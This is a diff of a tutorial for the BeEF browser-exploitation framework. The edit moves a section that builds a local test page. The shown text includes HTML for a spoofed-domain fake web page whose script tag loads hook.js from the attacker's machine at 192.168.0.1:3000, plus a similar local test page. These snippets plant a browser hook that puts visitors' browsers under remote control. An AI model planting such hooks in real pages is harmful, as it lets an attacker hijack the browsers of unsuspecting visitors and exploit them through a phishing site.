@@ -79,6 +79,24 @@ Open in your browser the URL `http://192.168.0.1:3000/ui/panel` and login with y
 
 _Note: If you follow the output inside the terminal, you will see that some other packages are required. Install them if you need them (maybe in second terminal session) and execute the BeEF command again (inside the Browser UI)._
 
+### Test BeEF local
+
+You can also test BeEF locally, but be careful!
+
+```html
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>local test of BeEF</title>
+</head>
+<body>
+  <p>This is my local test site...</p>
+<script src="http://[your ip of wlan0 interface]:3000/hook.js"></script>
+</body>
+</html>
+```
+
 ## Prepare the spoofed domain web page
 
 Now we place the `hook.js` inside the fake page.
@@ -104,24 +122,6 @@ Content of file `/var/www/html/index.html`.
   </div>
 <script type="text/javascript" src="scripts/script.js"></script>
 <script src="http://192.168.0.1:3000/hook.js"></script>
-</body>
-</html>
-```
-
-### Test BeEF local
-
-You can also test BeEF locally, but be careful!
-
-```html
-<!doctype html>
-<html lang="en">
-<head>
-  <meta charset="utf-8">
-  <title>local test of BeEF</title>
-</head>
-<body>
-  <p>This is my local test site...</p>
-<script src="http://[your ip of wlan0 interface]:3000/hook.js"></script>
 </body>
 </html>
 ```
